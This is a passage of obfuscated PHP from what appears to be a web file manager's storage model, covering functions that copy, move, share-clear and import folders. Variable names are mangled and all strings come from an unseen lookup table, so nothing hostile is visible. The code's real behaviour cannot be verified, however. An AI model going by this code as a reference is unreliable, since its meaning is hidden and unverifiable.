$ÜƒİéË¼[$ßÌŞ¯ÜŒ[461]] == $ßÌŞ¯ÜŒ[98]) { Model($ßÌŞ¯ÜŒ[609])->eventCopy($ˆßà”Æü); } $this->saveAll($ßÅß‘ˆ[$ßÌŞ¯ÜŒ[607]]); Model($ßÌŞ¯ÜŒ[224])->linkAdd($ßÅß‘ˆ[$ßÌŞ¯ÜŒ[605]]); $this->folderSizeReset($ÛÛ”¿ì); $this->updateModifyTime($ÛÛ”¿ì); return $ˆßà”Æü; } private function _copy($î™èÚ °, $ÍœŠ×œ‘, $‰Ÿî•‰, &$±†ãğŒ, $ĞùŸñâ¼, $¡Û ø³¨ = '') { $²’ëÃÅƒ =& $_SERVER[‚ûòÉ˜ş]; $úàçŠ˜ = $this->sourceInfoCache($î™èÚ °); $îºÊØ¶Æ = $úàçŠ˜[$²’ëÃÅƒ[461]] == $²’ëÃÅƒ[98]; $¸×—îßŠ = $¡Û ø³¨ ? $¡Û ø³¨ : $úàçŠ˜[$²’ëÃÅƒ[42]]; $Ø­´¹ÌÖ = $this->fileNameExistAuto($ÍœŠ×œ‘, $úàçŠ˜); if ($ĞùŸñâ¼) { $this->_childrenAllMake($î™èÚ °); if ($îºÊØ¶Æ && $Ø­´¹ÌÖ) { $this->_childrenAllMake($Ø­´¹ÌÖ); } } if (!$Ø­´¹ÌÖ) { return $this->_copyCreate($î™èÚ °, $ÍœŠ×œ‘, $¸×—îßŠ, $±†ãğŒ); } $‡²ÏŸäĞ = $Ø­´¹ÌÖ; if ($îºÊØ¶Æ) { if ($‰Ÿî•‰ == REPEAT_RENAME_FOLDER) { $¸×—îßŠ = $this->fileNameAutoCache($ÍœŠ×œ‘, $¸×—îßŠ, $‰Ÿî•‰, $îºÊØ¶Æ); $‡²ÏŸäĞ = $this->_copyCreate($î™èÚ °, $ÍœŠ×œ‘, $¸×—îßŠ, $±†ãğŒ); } else { $¸İŠÙƒ÷ = $this->_childrenList($î™èÚ °); foreach ($¸İŠÙƒ÷ as $ñòş‹À) { $this->_copy($ñòş‹À[$²’ëÃÅƒ[191]], $Ø­´¹ÌÖ, $‰Ÿî•‰, $±†ãğŒ, !1); } } } else { if ($‰Ÿî•‰ == REPEAT_RENAME || $‰Ÿî•‰ == REPEAT_RENAME_FOLDER) { $¸×—îßŠ = $this->fileNameAutoCache($ÍœŠ×œ‘, $¸×—îßŠ, $‰Ÿî•‰, $îºÊØ¶Æ); $‡²ÏŸäĞ = $this->_copyCreate($î™èÚ °, $ÍœŠ×œ‘, $¸×—îßŠ, $±†ãğŒ); } else { if ($‰Ÿî•‰ == REPEAT_REPLACE) { $ÙÀÄÉ±å = $this->sourceInfoCache($Ø­´¹ÌÖ); $²†²²Üâ = $this->fileHistory($ÙÀÄÉ±å, $úàçŠ˜[$²’ëÃÅƒ[517]], $úàçŠ˜[$²’ëÃÅƒ[86]]); if ($²†²²Üâ) { $±†ãğŒ[$²’ëÃÅƒ[605]][] = $úàçŠ˜[$²’ëÃÅƒ[517]]; } } else { if ($‰Ÿî•‰ == REPEAT_SKIP) { } } } Hook::trigger($²’ëÃÅƒ[610], array($²’ëÃÅƒ[611], $úàçŠ˜, 0)); } return $‡²ÏŸäĞ; } private function _copyCreate($Úƒî÷Í, $úÓ‡×æÌ, $‘Ë€–´¾, &$—›û­…§) { $¤È¾ÆØ“ =& $_SERVER[‚ûòÉ˜ş]; $ µã‡×ş = $this->sourceInfoCache($Úƒî÷Í); $½Ê™ê€ = $this->sourceInfoCache($úÓ‡×æÌ); $¡šÛï½ = $this->_makeItemData($ µã‡×ş, $½Ê™ê€, $‘Ë€–´¾); Hook::trigger($¤È¾ÆØ“[612], $¡šÛï½); Hook::trigger($¤È¾ÆØ“[613], array($¤È¾ÆØ“[614], $¡šÛï½, 0)); $º–Ğâ÷Ô = $this->add($¡šÛï½); $×õµéÍ = array($¤È¾ÆØ“[191] => $º–Ğâ÷Ô, $¤È¾ÆØ“[42] => $‘Ë€–´¾); $this->_copyApplyMeta($×õµéÍ, $—›û­…§); if ($ µã‡×ş[$¤È¾ÆØ“[461]] != $¤È¾ÆØ“[98]) { $—›û­…§[$¤È¾ÆØ“[605]][] = $ µã‡×ş[$¤È¾ÆØ“[517]]; return $º–Ğâ÷Ô; } $ÌÛŠ¾ê¦ = array(); $‹Ó¤ÀÕş = array(); $this->_childrenListAll($Úƒî÷Í, $ÌÛŠ¾ê¦); $¶¶”í–Ÿ = count($ÌÛŠ¾ê¦); if ($¶¶”í–Ÿ == 0) { return $º–Ğâ÷Ô; } $´ñú»û¹ = $this->sourceInfo($º–Ğâ÷Ô); foreach ($ÌÛŠ¾ê¦ as $È×»í‘Ş) { $çŞÂø¥è = $this->_makeItemData($È×»í‘Ş, $´ñú»û¹, $È×»í‘Ş[$¤È¾ÆØ“[42]]); $çŞÂø¥è[$¤È¾ÆØ“[561]] = $È×»í‘Ş[$¤È¾ÆØ“[561]]; $‹Ó¤ÀÕş[] = $çŞÂø¥è; } $this->chunkEventSet($¤È¾ÆØ“[615], array($¤È¾ÆØ“[616], $¡šÛï½, $¶¶”í–Ÿ)); $this->addAll($‹Ó¤ÀÕş, array(), !1); $ÖÜŸ•Â = $this->where(array($¤È¾ÆØ“[190] => $º–Ğâ÷Ô))->select(); $¢íĞêÔß = $this->_childrenMakeRelation($ÌÛŠ¾ê¦, $ÖÜŸ•Â); $¢íĞêÔß[$Úƒî÷Í] = $º–Ğâ÷Ô; $Öôôóœ€ = array(); $úØÑ¥íÄ = array(); foreach ($ÖÜŸ•Â as $È×»í‘Ş) { $ğÃ€İ“ = $È×»í‘Ş[$¤È¾ÆØ“[191]]; $Ú¡ë©· = $this->_childrenMatch($¢íĞêÔß, $È×»í‘Ş, $´ñú»û¹); $Öôôóœ€[] = array($¤È¾ÆØ“[191], $ğÃ€İ“, $¤È¾ÆØ“[190], $Ú¡ë©·[$¤È¾ÆØ“[190]]); $úØÑ¥íÄ[] = array($¤È¾ÆØ“[191], $ğÃ€İ“, $¤È¾ÆØ“[561], $Ú¡ë©·[$¤È¾ÆØ“[561]]); $this->_copyApplyMeta($È×»í‘Ş, $—›û­…§); if ($È×»í‘Ş[$¤È¾ÆØ“[461]] != $¤È¾ÆØ“[98]) { $—›û­…§[$¤È¾ÆØ“[605]][] = $È×»í‘Ş[$¤È¾ÆØ“[517]]; } } $this->chunkEventSet($¤È¾ÆØ“[617], array($¤È¾ÆØ“[618], $¡šÛï½, $¶¶”í–Ÿ)); $this->saveAll($Öôôóœ€); $this->chunkEventSet($¤È¾ÆØ“[619], array($¤È¾ÆØ“[620], $¡šÛï½, $¶¶”í–Ÿ)); $this->saveAll($úØÑ¥íÄ); return $º–Ğâ÷Ô; } private function _childrenMakeRelation($Ş¿—»ïØ, $üÅû´²ù) { $Ößá«ïô =& $_SERVER[‚ûòÉ˜ş]; $¾ÛÆ‚Í = array(); $áÒ±ºŒÊ = array(); foreach ($Ş¿—»ïØ as $ÙƒŒˆêÃ) { $Ë¹ŞÏÍÜ = $ÙƒŒˆêÃ[$Ößá«ïô[42]] . $Ößá«ïô[8] . $ÙƒŒˆêÃ[$Ößá«ïô[561]]; $¾ÛÆ‚Í[$Ë¹ŞÏÍÜ] = $ÙƒŒˆêÃ[$Ößá«ïô[191]]; } foreach ($üÅû´²ù as $ÙƒŒˆêÃ) { $Ë¹ŞÏÍÜ = $ÙƒŒˆêÃ[$Ößá«ïô[42]] . $Ößá«ïô[8] . $ÙƒŒˆêÃ[$Ößá«ïô[561]]; $‘ÌıŠ†Ğ = $¾ÛÆ‚Í[$Ë¹ŞÏÍÜ]; $áÒ±ºŒÊ[$‘ÌıŠ†Ğ] = $ÙƒŒˆêÃ[$Ößá«ïô[191]]; } return $áÒ±ºŒÊ; } private function _childrenMatch($ªš¾´ã‹, $ÀŞçì­Ø, $ïÒÜÙÍÕ) { $ÌÂõƒÈ¬ =& $_SERVER[‚ûòÉ˜ş]; $Œ¹æíä = $ïÒÜÙÍÕ[$ÌÂõƒÈ¬[561]]; $›Å ş€” = $this->parentLevelArray($ÀŞçì­Ø[$ÌÂõƒÈ¬[561]]); foreach ($›Å ş€” as $ª´ãáˆƒ) { if (isset($ªš¾´ã‹[$ª´ãáˆƒ])) { $Œ¹æíä .= $ªš¾´ã‹[$ª´ãáˆƒ] . $ÌÂõƒÈ¬[621]; } } $Œ¹æíä = rtrim($Œ¹æíä, $ÌÂõƒÈ¬[60]) . $ÌÂõƒÈ¬[60]; $ŠÇ¯Ú¢˜ = $this->parentLevelArray($Œ¹æíä); $ÏÈ·ãªñ = $ŠÇ¯Ú¢˜[count($ŠÇ¯Ú¢˜) - 1]; return array($ÌÂõƒÈ¬[190] => $ÏÈ·ãªñ, $ÌÂõƒÈ¬[561] => $Œ¹æíä); } private function _makeItemData($àŸ—ôüÆ, $ö­õşá, $¢”é¢Ú—) { $¿ì¾€Ÿ„ =& $_SERVER[‚ûòÉ˜ş]; $Ëµ•Ÿ‡Ë = array($¿ì¾€Ÿ„[622] => $àŸ—ôüÆ[$¿ì¾€Ÿ„[461]], $¿ì¾€Ÿ„[470] => $¢”é¢Ú—, $¿ì¾€Ÿ„[623] => $àŸ—ôüÆ[$¿ì¾€Ÿ„[462]] ? $àŸ—ôüÆ[$¿ì¾€Ÿ„[462]] : $¿ì¾€Ÿ„[12], $¿ì¾€Ÿ„[518] => $àŸ—ôüÆ[$¿ì¾€Ÿ„[517]] ? $àŸ—ôüÆ[$¿ì¾€Ÿ„[517]] : 0, $¿ì¾€Ÿ„[593] => $àŸ—ôüÆ[$¿ì¾€Ÿ„[86]] ? $àŸ—ôüÆ[$¿ì¾€Ÿ„[86]] : 0, $¿ì¾€Ÿ„[624] => intval($ö­õşá[$¿ì¾€Ÿ„[188]]), $¿ì¾€Ÿ„[625] => intval($ö­õşá[$¿ì¾€Ÿ„[546]]), $¿ì¾€Ÿ„[626] => intval(USER_ID), $¿ì¾€Ÿ„[627] => intval(USER_ID), $¿ì¾€Ÿ„[453] => intval($ö­õşá[$¿ì¾€Ÿ„[191]]), $¿ì¾€Ÿ„[628] => $ö­õşá[$¿ì¾€Ÿ„[561]] . $ö­õşá[$¿ì¾€Ÿ„[191]] . $¿ì¾€Ÿ„[60], $¿ì¾€Ÿ„[474] => $àŸ—ôüÆ[$¿ì¾€Ÿ„[95]] ? $àŸ—ôüÆ[$¿ì¾€Ÿ„[95]] : time(), $¿ì¾€Ÿ„[480] => 0, $¿ì¾€Ÿ„[629] => $¿ì¾€Ÿ„[12]); return $Ëµ•Ÿ‡Ë; } private function _copyApplyMeta($¤Âíô‘, &$ÍÏùì¯¸) { $óœñ‡»¿ =& $_SERVER[‚ûòÉ˜ş]; $Äìğâ¡Ì = $¤Âíô‘[$óœñ‡»¿[191]]; $£´±´‹Ø = $¤Âíô‘[$óœñ‡»¿[42]]; if (!isset($¤Âíô‘[$óœñ‡»¿[630]]) || !$¤Âíô‘[$óœñ‡»¿[630]] || $¤Âíô‘[$óœñ‡»¿[630]] == $óœñ‡»¿[222]) { $ÍÏùì¯¸[$óœñ‡»¿[607]][] = array($óœñ‡»¿[191], $Äìğâ¡Ì, $óœñ‡»¿[630], short_id($Äìğâ¡Ì)); } if (Input::check($£´±´‹Ø, $óœñ‡»¿[631])) { $ÍÏùì¯¸[$óœñ‡»¿[606]][] = array($óœñ‡»¿[191] => $Äìğâ¡Ì, $óœñ‡»¿[104] => $óœñ‡»¿[514], $óœñ‡»¿[427] => str_replace($óœñ‡»¿[63], $óœñ‡»¿[12], Pinyin::get($£´±´‹Ø))); $ÍÏùì¯¸[$óœñ‡»¿[606]][] = array($óœñ‡»¿[191] => $Äìğâ¡Ì, $óœñ‡»¿[104] => $óœñ‡»¿[513], $óœñ‡»¿[427] => Pinyin::get($£´±´‹Ø, $óœñ‡»¿[632])); } $ÍÏùì¯¸[$óœñ‡»¿[606]][] = array($óœñ‡»¿[191] => $Äìğâ¡Ì, $óœñ‡»¿[104] => $óœñ‡»¿[493], $óœñ‡»¿[427] => KodSort::makeStr($£´±´‹Ø)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Ù÷ûØ” ) { $õˆóœÚ¬ =& $_SERVER[‚ûòÉ˜ş]; $ã¶Ë§ç = $this->sourceInfo($Ù÷ûØ” ); $æ‹­™–‚ = $õˆóœÚ¬[633]; $İ„Æ®ú = array($õˆóœÚ¬[561] => array($õˆóœÚ¬[588], $ã¶Ë§ç[$õˆóœÚ¬[561]] . $Ù÷ûØ”  . $õˆóœÚ¬[589]), $õˆóœÚ¬[481] => $this->targetIsDelete); $óáË³ú = $this->field($æ‹­™–‚)->where($İ„Æ®ú)->select(); if (!$óáË³ú) { return; } $óáË³ú = array_to_keyvalue($óáË³ú, $õˆóœÚ¬[191]); foreach ($óáË³ú as $üğèË… ) { $±Üµı›„ = $üğèË… [$õˆóœÚ¬[190]]; $Ù÷ûØ”  = $üğèË… [$õˆóœÚ¬[191]]; if (!isset($this->_childrenListCache[$Ù÷ûØ” ]) && $üğèË… [$õˆóœÚ¬[461]] == $õˆóœÚ¬[98]) { $this->_childrenListCache[$Ù÷ûØ” ] = array(); } if (!isset($this->_childrenListCache[$±Üµı›„])) { $this->_childrenListCache[$±Üµı›„] = array(); } $this->_childrenListCache[$±Üµı›„][$Ù÷ûØ” ] = $üğèË… ; $this->_childrenItemCache[$Ù÷ûØ” ] = $üğèË… ; } } private function _childrenListAll($úÎü¨À¤, &$Õ¿º¶û) { $ıêéåò¾ =& $_SERVER[‚ûòÉ˜ş]; if (!isset($this->_childrenListCache[$úÎü¨À¤])) { return; } $èÍÆÑï = $this->_childrenListCache[$úÎü¨À¤]; foreach ($èÍÆÑï as $¥üğ˜“ => $‚ï¹’¾Ù) { $Õ¿º¶û[$¥üğ˜“] = $‚ï¹’¾Ù; if ($‚ï¹’¾Ù[$ıêéåò¾[461]] == $ıêéåò¾[98]) { $this->_childrenListAll($¥üğ˜“, $Õ¿º¶û); } } } private function sourceInfoCache($½‘”¡Ê±) { if (isset($this->_childrenItemCache[$½‘”¡Ê±])) { return $this->_childrenItemCache[$½‘”¡Ê±]; } return $this->sourceInfo($½‘”¡Ê±); } private function _childrenList($ŞßŸú¿®) { if (isset($this->_childrenListCache[$ŞßŸú¿®])) { return $this->_childrenListCache[$ŞßŸú¿®]; } return $this->_childrenListSelect($ŞßŸú¿®); } private function _childrenListSelect($°†Õ¬ÖÕ) { $­ä–Ê¤ö =& $_SERVER[‚ûòÉ˜ş]; $ëË®šÜ = array($­ä–Ê¤ö[190] => $°†Õ¬ÖÕ, $­ä–Ê¤ö[481] => $this->targetIsDelete); $ìèÊÀŸê = $this->where($ëË®šÜ)->select(); $ìèÊÀŸê = $ìèÊÀŸê ? $ìèÊÀŸê : array(); $¾ºƒèÒœ = array_to_keyvalue($ìèÊÀŸê, $­ä–Ê¤ö[191]); $this->_childrenListCache[$°†Õ¬ÖÕ] = $¾ºƒèÒœ; foreach ($¾ºƒèÒœ as $°†Õ¬ÖÕ => $¬£›Ö½) { $this->_childrenItemCache[$°†Õ¬ÖÕ] = $¬£›Ö½; } return $¾ºƒèÒœ; } private function fileNameExistAuto($¶œÓùšã, $™Ïû¡¢à) { $ŠŠœ÷Ò =& $_SERVER[‚ûòÉ˜ş]; if ($™Ïû¡¢à[$ŠŠœ÷Ò[481]] == $ŠŠœ÷Ò[98]) { return $this->fileNameExist($¶œÓùšã, $™Ïû¡¢à[$ŠŠœ÷Ò[42]]); } return $this->fileNameExistCache($¶œÓùšã, $™Ïû¡¢à[$ŠŠœ÷Ò[42]]); } private function fileNameExistCache($ìšŠ¡—, $üûñà­) { $âŠğ×‰ =& $_SERVER[‚ûòÉ˜ş]; $üûñà­ = strtolower($üûñà­); $……ŒÒŠ = $this->_childrenList($ìšŠ¡—); foreach ($……ŒÒŠ as $ÔÌÂÌ û) { if ($üûñà­ == strtolower($ÔÌÂÌ û[$âŠğ×‰[42]])) { return $ÔÌÂÌ û[$âŠğ×‰[191]]; } } return !1; } private function fileNameAutoCache($ò€ŒâæÁ, $±Ò¬÷©¢, $öèÓ‘ó¦, $öúªîàä) { $ºôØºÉà =& $_SERVER[‚ûòÉ˜ş]; $ÌÁ‰Íº = $this->_childrenList($ò€ŒâæÁ); $î‹›ü = array_to_keyvalue($ÌÁ‰Íº, $ºôØºÉà[12], $ºôØºÉà[42]); return $this->fileNameAutoGet($î‹›ü, $±Ò¬÷©¢, $öèÓ‘ó¦, $öúªîàä); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($†Òº§½“, $İ¿ëïíÀ, $ïËø¥ = REPEAT_REPLACE, $¬Ëí¯•¨ = '') { $ŒÛ’÷¯Æ =& $_SERVER[‚ûòÉ˜ş]; $åˆ×…Ù = $this->sourceInfo($†Òº§½“); $¶Ä„´ô = $this->sourceInfo($İ¿ëïíÀ); if ($åˆ×…Ù[$ŒÛ’÷¯Æ[190]] == $¶Ä„´ô[$ŒÛ’÷¯Æ[191]]) { if ($åˆ×…Ù[$ŒÛ’÷¯Æ[481]] == $ŒÛ’÷¯Æ[98]) { Model($ŒÛ’÷¯Æ[479])->restore(array($†Òº§½“)); } if (!$¬Ëí¯•¨ || $¬Ëí¯•¨ == $åˆ×…Ù[$ŒÛ’÷¯Æ[42]]) { return $†Òº§½“; } } $€³¶Å±æ = $this->pathInfoMore($†Òº§½“); if ($this->isParentOf($†Òº§½“, $İ¿ëïíÀ)) { return !1; } if (!$åˆ×…Ù || !$¶Ä„´ô || $¶Ä„´ô[$ŒÛ’÷¯Æ[461]] != $ŒÛ’÷¯Æ[98]) { return !1; } Hook::trigger($ŒÛ’÷¯Æ[634], $€³¶Å±æ); $this->targetIsDelete = intval($åˆ×…Ù[$ŒÛ’÷¯Æ[481]]); if ($åˆ×…Ù[$ŒÛ’÷¯Æ[190]] == $İ¿ëïíÀ && $¬Ëí¯•¨ != $åˆ×…Ù[$ŒÛ’÷¯Æ[42]]) { $ĞĞÁ›Û„ = $this->fileNameExist($İ¿ëïíÀ, $¬Ëí¯•¨); if ($ĞĞÁ›Û„ && $åˆ×…Ù[$ŒÛ’÷¯Æ[461]] == $ŒÛ’÷¯Æ[222]) { $°·™èÅ¾ = $this->sourceInfo($ĞĞÁ›Û„); $öÀ¢ÒßÓ = $this->fileHistory($°·™èÅ¾, $åˆ×…Ù[$ŒÛ’÷¯Æ[517]], $åˆ×…Ù[$ŒÛ’÷¯Æ[86]]); if (!$öÀ¢ÒßÓ) { Model($ŒÛ’÷¯Æ[520])->remove($åˆ×…Ù[$ŒÛ’÷¯Æ[517]]); } $this->removeNow($†Òº§½“, !1); $this->folderSizeReset($İ¿ëïíÀ); Hook::trigger($ŒÛ’÷¯Æ[635], $€³¶Å±æ); return $ĞĞÁ›Û„; } } $»¹é‹ïû = $¬Ëí¯•¨ ? $¬Ëí¯•¨ : $åˆ×…Ù[$ŒÛ’÷¯Æ[42]]; $this->lockMoveStart($†Òº§½“); $this->lockWriteStart($İ¿ëïíÀ, $»¹é‹ïû); $×¦Ëœ× = array($ŒÛ’÷¯Æ[605] => array(), $ŒÛ’÷¯Æ[636] => !1); $this->clearShare($†Òº§½“, $İ¿ëïíÀ); $¶ÛÆÕÂŞ = $this->fileNameExistAuto($İ¿ëïíÀ, $åˆ×…Ù); $¦âÙ²ğª = $this->_move($†Òº§½“, $İ¿ëïíÀ, $ïËø¥, $×¦Ëœ×, $¬Ëí¯•¨); $this->sourceCacheClear(); if ($åˆ×…Ù[$ŒÛ’÷¯Æ[461]] == $ŒÛ’÷¯Æ[98] && $¶ÛÆÕÂŞ) { $this->folderSizeResetChildren($¦âÙ²ğª); } Model($ŒÛ’÷¯Æ[224])->linkAdd($×¦Ëœ×[$ŒÛ’÷¯Æ[605]]); if ($¶ÛÆÕÂŞ && $×¦Ëœ×[$ŒÛ’÷¯Æ[636]]) { $this->removeNow($†Òº§½“, !1); } $this->lockMoveEnd($†Òº§½“); $this->lockWriteEnd($İ¿ëïíÀ, $»¹é‹ïû); $this->folderSizeReset($åˆ×…Ù[$ŒÛ’÷¯Æ[190]]); $this->folderSizeReset($İ¿ëïíÀ); $ôİº÷Ÿ© = array($åˆ×…Ù[$ŒÛ’÷¯Æ[190]], $İ¿ëïíÀ); if ($åˆ×…Ù[$ŒÛ’÷¯Æ[461]] == $ŒÛ’÷¯Æ[98]) { $ôİº÷Ÿ©[] = $†Òº§½“; } $this->updateModifyTime($ôİº÷Ÿ©); Model($ŒÛ’÷¯Æ[609])->eventMove($†Òº§½“, $åˆ×…Ù[$ŒÛ’÷¯Æ[190]], $İ¿ëïíÀ); Hook::trigger($ŒÛ’÷¯Æ[635], $€³¶Å±æ); return $¦âÙ²ğª; } private function _move($·¯¥Â¢, $ÄÚÕë, $’ì½Ó²º, &$†şø˜¤É, $«¨âµåõ = '') { $ÏŠõíÍ­ =& $_SERVER[‚ûòÉ˜ş]; $İ°öÜõ = $this->sourceInfo($·¯¥Â¢); $ëùÄò‡› = $İ°öÜõ[$ÏŠõíÍ­[461]] == $ÏŠõíÍ­[98]; $òò–¤Äó = $«¨âµåõ ? $«¨âµåõ : $İ°öÜõ[$ÏŠõíÍ­[42]]; $°ÓğõıÌ = $this->fileNameExistAuto($ÄÚÕë, $İ°öÜõ); $this->lockMoveStart($·¯¥Â¢); $this->lockWriteStart($ÄÚÕë, $òò–¤Äó); if (!$°ÓğõıÌ) { return $this->_moveForce($·¯¥Â¢, $ÄÚÕë, $òò–¤Äó); } $ù‹öÜª = $°ÓğõıÌ; $á‹–şï = !1; if ($ëùÄò‡›) { if ($’ì½Ó²º == REPEAT_RENAME_FOLDER) { $òò–¤Äó = $this->fileNameAuto($ÄÚÕë, $òò–¤Äó, $’ì½Ó²º, $ëùÄò‡›); $ù‹öÜª = $this->_moveForce($·¯¥Â¢, $ÄÚÕë, $òò–¤Äó); } else { if ($’ì½Ó²º == REPEAT_RENAME_FOLDER) { $’ì½Ó²º = REPEAT_RENAME; } $üÌôÔ« = $this->_childrenListSelect($·¯¥Â¢); foreach ($üÌôÔ« as $°èÌîòİ) { $this->_move($°èÌîòİ[$ÏŠõíÍ­[191]], $°ÓğõıÌ, $’ì½Ó²º, $†şø˜¤É); } $á‹–şï = !0; } } else { if ($’ì½Ó²º == REPEAT_SKIP) { $á‹–şï = !0; } else { if ($’ì½Ó²º == REPEAT_RENAME || $’ì½Ó²º == REPEAT_RENAME_FOLDER) { $òò–¤Äó = $this->fileNameAuto($ÄÚÕë, $òò–¤Äó, $’ì½Ó²º, $ëùÄò‡›); $ù‹öÜª = $this->_moveForce($·¯¥Â¢, $ÄÚÕë, $òò–¤Äó); } else { if ($’ì½Ó²º == REPEAT_REPLACE) { $Íœœ±Å = $this->sourceInfoCache($°ÓğõıÌ); $¸‡¿‘èö = $this->fileHistory($Íœœ±Å, $İ°öÜõ[$ÏŠõíÍ­[517]], $İ°öÜõ[$ÏŠõíÍ­[86]]); $á‹–şï = !0; if ($¸‡¿‘èö) { $†şø˜¤É[$ÏŠõíÍ­[605]][] = $İ°öÜõ[$ÏŠõíÍ­[517]]; } } } } } if ($á‹–şï && !$†şø˜¤É[$ÏŠõíÍ­[636]]) { $†şø˜¤É[$ÏŠõíÍ­[636]] = !0; } return $ù‹öÜª; } private function _moveForce($‹È»Ùˆ, $¾Àõ¹Õ, $¬ÕïñŒØ) { $ÂÖ–İ£¶ =& $_SERVER[‚ûòÉ˜ş]; $Õ‡Ó±Ò = $this->sourceInfo($‹È»Ùˆ); $ş¸Ú§¾ = $this->sourceInfo($¾Àõ¹Õ); $âë®– = $Õ‡Ó±Ò[$ÂÖ–İ£¶[461]] == $ÂÖ–İ£¶[98]; $Ñîñ‘À = array($ÂÖ–İ£¶[453] => $ş¸Ú§¾[$ÂÖ–İ£¶[191]], $ÂÖ–İ£¶[628] => $ş¸Ú§¾[$ÂÖ–İ£¶[561]] . $ş¸Ú§¾[$ÂÖ–İ£¶[191]] . $ÂÖ–İ£¶[60], $ÂÖ–İ£¶[624] => $ş¸Ú§¾[$ÂÖ–İ£¶[188]], $ÂÖ–İ£¶[625] => $ş¸Ú§¾[$ÂÖ–İ£¶[546]], $ÂÖ–İ£¶[627] => USER_ID, $ÂÖ–İ£¶[470] => $¬ÕïñŒØ); $€ù©¨Ô = $Õ‡Ó±Ò[$ÂÖ–İ£¶[188]] == SourceModel::TYPE_GROUP && $ş¸Ú§¾[$ÂÖ–İ£¶[188]] == SourceModel::TYPE_GROUP && $Õ‡Ó±Ò[$ÂÖ–İ£¶[546]] == $ş¸Ú§¾[$ÂÖ–İ£¶[546]]; if (!$€ù©¨Ô && $this->moveClearAuth) { Model($ÂÖ–İ£¶[543])->authClear($‹È»Ùˆ); } $–º¯ÁĞÕ = $Õ‡Ó±Ò[$ÂÖ–İ£¶[481]] == $ÂÖ–İ£¶[98] && $ş¸Ú§¾[$ÂÖ–İ£¶[481]] != $ÂÖ–İ£¶[98]; if ($–º¯ÁĞÕ) { $Ñîñ‘À[$ÂÖ–İ£¶[480]] = 0; } if ($âë®–) { $ÒÒ¹·õ¯ = array($ÂÖ–İ£¶[628] => array($ÂÖ–İ£¶[588], $Õ‡Ó±Ò[$ÂÖ–İ£¶[561]] . $Õ‡Ó±Ò[$ÂÖ–İ£¶[191]] . $ÂÖ–İ£¶[589])); $¼ù©ç¿Ö = $Õ‡Ó±Ò[$ÂÖ–İ£¶[561]] . $Õ‡Ó±Ò[$ÂÖ–İ£¶[191]] . $ÂÖ–İ£¶[60]; $üŒÂîûç = $ş¸Ú§¾[$ÂÖ–İ£¶[561]] . $ş¸Ú§¾[$ÂÖ–İ£¶[191]] . $ÂÖ–İ£¶[60] . $Õ‡Ó±Ò[$ÂÖ–İ£¶[191]] . $ÂÖ–İ£¶[60]; $½íŞ­éë = array($ÂÖ–İ£¶[628] => array($ÂÖ–İ£¶[637], "\162\145\160\154\141\143\x65\50\x70\141\x72\x65\x6e\164\x4c\x65\x76\145\x6c\54\47{$¼ù©ç¿Ö}\47\x2c\x27{$üŒÂîûç}\47\51"), $ÂÖ–İ£¶[624] => $ş¸Ú§¾[$ÂÖ–İ£¶[188]], $ÂÖ–İ£¶[625] => $ş¸Ú§¾[$ÂÖ–İ£¶[546]]); if ($–º¯ÁĞÕ) { $½íŞ­éë[$ÂÖ–İ£¶[480]] = 0; } $this->where($ÒÒ¹·õ¯)->data($½íŞ­éë)->save(); } $this->where(array($ÂÖ–İ£¶[467] => $‹È»Ùˆ))->data($Ñîñ‘À)->save(); return $‹È»Ùˆ; } private function clearShare($Ôæ‰‹°, $Áòéêº‰) { $µÆİêÛ² =& $_SERVER[‚ûòÉ˜ş]; $«’¤±Ûû = $this->sourceInfo($Ôæ‰‹°); $è‚ñÛ®ô = $this->sourceInfo($Áòéêº‰); if ($«’¤±Ûû[$µÆİêÛ²[546]] == $è‚ñÛ®ô[$µÆİêÛ²[546]] && $«’¤±Ûû[$µÆİêÛ²[188]] == $µÆİêÛ²[638]) { return; } $§±†áß = array($µÆİêÛ²[561] => array($µÆİêÛ²[588], $«’¤±Ûû[$µÆİêÛ²[561]] . $Ôæ‰‹° . $µÆİêÛ²[589])); $íÆ”õÈã = $this->field($µÆİêÛ²[467])->where($§±†áß)->getField($µÆİêÛ²[191], !0); if (!$íÆ”õÈã) { return; } $§±†áß = array($µÆİêÛ²[191] => array($µÆİêÛ²[7], $íÆ”õÈã), $µÆİêÛ²[639] => 1); $çÃ›š— = Model($µÆİêÛ²[640])->field($µÆİêÛ²[641])->where($§±†áß)->select(); if (!$çÃ›š—) { return; } $çÃ›š— = array_to_keyvalue($çÃ›š—, $µÆİêÛ²[12], $µÆİêÛ²[641]); $§±†áß = array($µÆİêÛ²[641] => array($µÆİêÛ²[7], $çÃ›š—)); Model($µÆİêÛ²[640])->where($§±†áß)->save(array($µÆİêÛ²[639] => 0)); Model($µÆİêÛ²[642])->where($§±†áß)->delete(); } public function copyFolderFromIO($ä´ü¿üã, $ùÍéğºî, $ó–¯óÃÇ, $ñóôÁê, $Ù¯‹³×¹, $ï„êé = false) { $äï¥ =& $_SERVER[‚ûòÉ˜ş]; $¨ÇÙè¤ú = array($äï¥[606] => array(), $äï¥[607] => array(), $äï¥[605] => array(), $äï¥[643] => array()); $àüÍ€¼¢ = $ï„êé ? $ï„êé : $ä´ü¿üã->pathThis($ùÍéğºî); $òÆËÏŸ = $this->fileNameExist($ó–¯óÃÇ, $àüÍ€¼¢); $¾Ã£ŸÖ³ = $this->mkdir($ó–¯óÃÇ, $àüÍ€¼¢, $ñóôÁê); if (!$òÆËÏŸ || $ñóôÁê == REPEAT_RENAME_FOLDER) { $ñóôÁê = !1; } if ($òÆËÏŸ) { $this->_childrenAllMake($òÆËÏŸ); } Hook::trigger($äï¥[644]); $this->_copyChildTo($ä´ü¿üã, $ùÍéğºî, $¾Ã£ŸÖ³, $ñóôÁê, $¨ÇÙè¤ú, $Ù¯‹³×¹); Hook::trigger($äï¥[645]); if ($¾Ã£ŸÖ³) { $this->folderSizeResetChildren($¾Ã£ŸÖ³); } $this->_childrenListClear(); Model($äï¥[608])->addAll($¨ÇÙè¤ú[$äï¥[606]], array(), !0); Model($äï¥[609])->eventCopy($¾Ã£ŸÖ³); $this->saveAll($¨ÇÙè¤ú[$äï¥[607]]); Model($äï¥[520])->linkAdd($¨ÇÙè¤ú[$äï¥[605]]); Model($äï¥[520])->remove($¨ÇÙè¤ú[$äï¥[643]]); $this->folderSizeReset($ó–¯óÃÇ); $this->updateModifyTime($ó–¯óÃÇ); return $¾Ã£ŸÖ³; } private function _copyChildTo($³·”°å, $†Ê¬À», $ó¶«î, 